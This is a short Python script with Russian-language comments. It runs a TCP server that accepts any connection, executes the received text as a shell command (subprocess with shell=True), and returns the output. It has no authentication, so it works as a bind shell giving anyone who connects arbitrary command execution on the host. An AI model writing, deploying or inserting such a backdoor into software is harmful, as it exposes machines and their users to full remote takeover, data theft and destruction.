import socket
import subprocess

import sys

host = sys.argv[1]
port = sys.argv[2]
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((host,int(port)))
server_socket.listen(1)
print(f"Сервер запущен на {host}:{port}. Ожидание подключения...")

while True:


    conn, addr = server_socket.accept()
    print(f"Подключено к {addr}")


    # Ожидаем команду от клиента
    command = conn.recv(1024).decode('utf-8')




    # Выполняем команду и получаем результат
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
        conn.sendall(output)
        conn.close()
    except subprocess.CalledProcessError as e:
        conn.sendall(e.output)
        conn.close()


